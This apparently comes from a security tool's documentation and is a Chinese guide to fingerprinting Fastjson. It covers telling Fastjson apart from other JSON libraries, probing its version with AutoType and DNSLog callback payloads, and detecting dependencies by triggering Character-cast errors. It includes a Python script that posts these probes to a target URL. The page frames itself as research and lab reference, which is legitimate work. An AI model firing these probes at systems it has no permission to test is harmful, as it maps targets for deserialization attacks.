---
title: Fastjson 探测分析
description: 识别 Fastjson、区分其他 JSON 库、版本与依赖探测的方法总结
order: 1
---

# Fastjson 探测分析

本文汇总 Fastjson **识别**、**版本探测**、**依赖探测**与**期望类判断**的常用手法，供安全研究与本地复现参考。

相关阅读：

- [版本探测思路](https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA)
- [期望类判断](https://mp.weixin.qq.com/s/7c_zi5Pv4a69IV0zzJo5Ww)

---

## 1. Fastjson 判断

### 1.1 根据报错信息判断

破坏 JSON 结构，观察报错回显是否像 Fastjson：

```json
{"age":20,"name":"Bob"
```

利用 `@type` 检测 AutoType 是否开启：

```json
{"@type":"whatever"}
```

### 1.2 根据解析变化判断

Fastjson 支持部分“宽松”语法与特性，可构造探针观察解析结果差异：

```json
{"a":new a(1),"b":x'11',/*\*/"c":Set[{}{}],"d":"\u0000\x00"}
```

`$ref` 自引用：

```json
{"ext":"blue","name":{"$ref":"$.ext"}}
```

### 1.3 DNS 请求

出网时可配合 DNSLog；不出网时，也可观察响应是否明显变慢：

```json
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
```

### 1.4 区别 Jackson

| 探针 | Jackson | Fastjson |
|------|---------|----------|
| 多余字段 `{"age":20,"name":"Bob","test":1}` | 常报错 | 通常不报错 |
| 单引号 `{"age":20,'name':'Bob'}` | 不支持 | 支持 |
| 注释 `}/*#aaaa` | 可容忍 `/*#` | 会报错（注释符是 `//`） |
| 超长小数精度 | 可能丢失 | 行为不同，可对比 |

示例：

```json
{"age":20,"name":"Bob","test":1}
```

```json
{"age":20,'name':'Bob'}
```

```json
{
    "age":20,
    "name":'Bob'
}/*#aaaa
```

```json
{
    "age":20.111111111111111111111111111,
    "name":'Bob'
}
```

### 1.5 区别 Gson

浮点精度：

```json
{a:1.111111111111111111111111111}
```

注释符（Gson 侧常见 `#` 风格差异）：

```text
#\r\n{a:1}
```

### 1.6 区别 org.json

特殊字符处理差异：

```json
{a:'\r'}
```

---

## 2. 版本探测

### 2.1 AutoType 探测

```json
{"xxx":{"@type":"java.lang.Class","val":""}}
```

```json
{"xxx":{"@type":"Random.String"}}
```

| 状态 | payload1（`java.lang.Class`） | payload2（`Random.String`） |
|------|-------------------------------|-----------------------------|
| AutoType **开启** | 报错：`autoType is not support. java.lang.Class` | **不报错** |
| AutoType **关闭** | **不报错** | 报错：`autoType is not support. Random.String` |

### 2.2 AutoCloseable 精确探测

```json
{"@type":"java.lang.AutoCloseable"
```

注意：Fastjson **1.2.76 之后**，即便用该方式，探测结果也常会“卡”在 **1.2.76**。

### 2.3 1.2.83 具体探测

```json
{"xxx":{"@type":"Test.TestException"}}
```

仅在 **1.2.83** 时通常**不报错**。

### 2.4 DNSLog 大致版本

#### ≤ 1.2.47

```json
[
  {
    "@type": "java.lang.Class",
    "val": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.net.InetSocketAddress",
    "address": "",
    "val": "aaa.xxxx.ceye.io"
  }
]
```

#### ≤ 1.2.68

```json
[
  {
    "@type": "java.lang.AutoCloseable",
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.net.InetSocketAddress",
    "address": "",
    "val": "bbb.n41tma.ceye.io"
  }
]
```

#### ≤ 1.2.80 / 1.2.83

```json
[
  {
    "@type": "java.lang.Exception",
    "@type": "com.alibaba.fastjson.JSONException",
    "x": {
      "@type": "java.net.InetSocketAddress",
      "address": "",
      "val": "ccc.4fhgzj.dnslog.cn"
    }
  },
  {
    "@type": "java.lang.Exception",
    "@type": "com.alibaba.fastjson.JSONException",
    "message": {
      "@type": "java.net.InetSocketAddress",
      "address": "",
      "val": "ddd.4fhgzj.dnslog.cn"
    }
  }
]
```

- **≤ 1.2.80**：通常只收到**第一个** DNS 请求  
- **1.2.83**：可能收到**两个** DNS 请求  

### 2.5 不出网探测（按 500 / 正常响应）

#### 不报错：1.2.83 / 1.2.24；报错：1.2.25–1.2.80

```json
{"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}
```

#### 不报错：1.2.24–1.2.68；报错：1.2.70–1.2.83

```json
{"zero":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}
```

#### 不报错：1.2.24–1.2.47；报错：1.2.48–1.2.83

```json
{
  "a": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl"
  }
}
```

#### 不报错：1.2.24；报错：1.2.25–1.2.83

```json
{"zero": {"@type": "com.sun.rowset.JdbcRowSetImpl"}}
```

---

## 3. 依赖探测

### 3.1 Character 转换报错

核心思路：嵌套畸形结构，迫使 Fastjson 对目标类做 `Character` 转换：

- 类**存在**：响应常含 `can not cast`
- 类**不存在**：常见 `No message available` 等空/无关信息

模板示意：

```json
{
  "x": {
    "@type": "java.lang.Character"{
      "@type": "java.lang.Class",
      "val": "org.springframework.web.bind.annotation.RequestMapping"
    }
  }
}
```

> 这是故意畸形的 JSON 探针，需按原始文本投递，不要先被本地格式化“修掉”。

### 3.2 常见依赖类

| 类名 | 说明 |
|------|------|
| `org.springframework.web.bind.annotation.RequestMapping` | SpringBoot |
| `org.apache.catalina.startup.Tomcat` | Tomcat |
| `groovy.lang.GroovyShell` | Groovy（关注 1.2.80 语境） |
| `com.mchange.v2.c3p0.DataSources` | C3P0 |
| `org.apache.ibatis.datasource.unpooled.UnpooledDataSource` | MyBatis |
| `org.h2.jdbcx.JdbcDataSource` | H2 |
| `com.mysql.jdbc.Buffer` | mysql-jdbc-5 |
| `com.mysql.cj.api.authentication.AuthenticationProvider` | mysql-connector-6 |
| `com.mysql.cj.protocol.AuthenticationProvider` | mysql-connector-8 |
| `jdk.nashorn.tools.Shell` | JDK 8 |
| `java.net.http.HttpClient` | JDK 11 |
| `com.sun.org.apache.bcel.internal.util.ClassLoader` | ≤ JDK 8u251 |
| `org.apache.ibatis.type.Alias` | MyBatis |
| `org.apache.tomcat.dbcp.dbcp.BasicDataSource` | tomcat-dbcp-7 / BCEL |
| `org.apache.tomcat.dbcp.dbcp2.BasicDataSource` | tomcat-dbcp-8+ / BCEL |
| `org.apache.commons.dbcp.BasicDataSource` | commons-dbcp ≤ 1.4 |
| `org.apache.commons.dbcp2.BasicDataSource` | commons-dbcp2 ≤ 2.13.0 |
| `org.apache.commons.io.ByteOrderMark` | commons-io（通用） |
| `org.apache.commons.io.Java7Support` | commons-io 2.5 独有 |
| `org.apache.commons.io.IOIndexedException` | commons-io 2.7 独有 |
| `org.apache.commons.io.file.Counters` | commons-io 2.7–2.8 |
| `org.apache.commons.io.FileSystem` | commons-io 2.7 独有 |
| `org.apache.commons.io.file.PathUtils` | commons-io 2.7 独有 |
| `org.apache.commons.io.function.IOConsumer` | commons-io 2.7 独有 |
| `org.aspectj.ajde.Ajde` | aspectjtools |
| `com.fasterxml.jackson.core.exc.InputCoercionException` | Jackson |
| `org.python.antlr.ParseException` | Jython |
| `org.postgresql.jdbc.PgConnection` | PostgreSQL |

### 3.3 扫描脚本示意

批量替换类名投递模板，根据响应是否包含 `can not cast to char` 判定：

```python
import requests
import os


def jar_scanner(url: str, timeout: int = 10) -> list:
    """扫描目标 URL 的 Fastjson 依赖库。"""
    base_dir = os.path.dirname(os.path.abspath(__file__))
    jar_list_path = os.path.join(base_dir, "poc", "jarList.txt")
    jar_scan_path = os.path.join(base_dir, "poc", "jarScan.json")

    with open(jar_scan_path, "r", encoding="utf-8") as f:
        poc_template = f.read()

    with open(jar_list_path, "r", encoding="utf-8") as f:
        lines = f.readlines()

    detected_jars = []

    for line in lines:
        line = line.strip()
        if not line or "//" not in line:
            continue

        parts = line.split("//")
        clazz = parts[0].strip()
        description = parts[1].strip() if len(parts) > 1 else ""
        poc_data = poc_template.replace("${clazz}", clazz)

        try:
            response = requests.post(
                url,
                data=poc_data,
                headers={"Content-Type": "application/json"},
                timeout=timeout,
            )
            if "can not cast to char" in response.text:
                print(f"[+] 发现依赖: {description} ({clazz})")
                detected_jars.append(
                    {
                        "class": clazz,
                        "description": description,
                        "line": line.strip(),
                    }
                )
            else:
                print(f"[-] 未检测到: {description} ({clazz})")
        except requests.exceptions.Timeout:
            print(f"[!] 请求超时: {clazz}")
        except requests.exceptions.RequestException as e:
            print(f"[!] 请求失败: {clazz} - {e}")

    return detected_jars


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python main.py <target_url>")
        sys.exit(1)

    results = jar_scanner(sys.argv[1])
    print(f"[*] 扫描完成，共发现 {len(results)} 个依赖")
```

本工具的依赖探测页对接 `/api/deps`，实现了同类 Character 报错思路。

---

## 4. 期望类判断

业务接口若绑定了期望类型（例如 `Person`），`@type` / 语法探针的行为会与“裸 JSONObject”不同。

可结合 Feature `@type` 与空键等语法，判断服务端是否按期望类反序列化。详见：

- [判断是否存在期望类](https://mp.weixin.qq.com/s/7c_zi5Pv4a69IV0zzJo5Ww)

本工具探测页已将「识别 → 版本 → 期望类」按序编排。

---

## 5. 实操建议

1. **先识别再版本**：确认 Fastjson 后再做版本二分，避免 Jackson/Gson 误判。  
2. **出网 / 不出网分流**：有 DNSLog 用 DNS 版；否则用报错与 HTTP 状态码版。  
3. **畸形 JSON 保真**：Character 依赖探针等不要被客户端 JSON 序列化“修好”。  
4. **结合靶场验证**：用本仓库 `lab/` 下不同版本环境交叉验证探针表现。
